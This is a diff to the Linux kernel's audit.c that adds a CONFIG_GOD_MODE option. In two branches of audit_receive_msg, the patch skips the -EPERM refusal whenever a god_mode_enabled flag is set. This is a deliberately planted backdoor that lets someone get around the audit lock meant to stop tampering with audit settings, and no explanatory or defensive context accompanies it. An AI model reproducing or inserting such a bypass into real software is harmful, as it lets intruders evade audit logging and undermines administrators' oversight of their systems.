@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /* audit.c -- Auditing support
  * Gateway between the kernel (e.g., selinux) and the user-space audit daemon.
  * System-call specific features have moved to auditsc.c
@@ -774,7 +777,15 @@ static int audit_receive_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
 			audit_log_format(ab, " audit_enabled=%d res=0",
 					 audit_enabled);
 			audit_log_end(ab);
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 		/* fallthrough */
 	case AUDIT_LIST:
@@ -793,7 +804,15 @@ static int audit_receive_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
 			audit_log_format(ab, " audit_enabled=%d res=0",
 					 audit_enabled);
 			audit_log_end(ab);
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 		/* fallthrough */
 	case AUDIT_LIST_RULES:
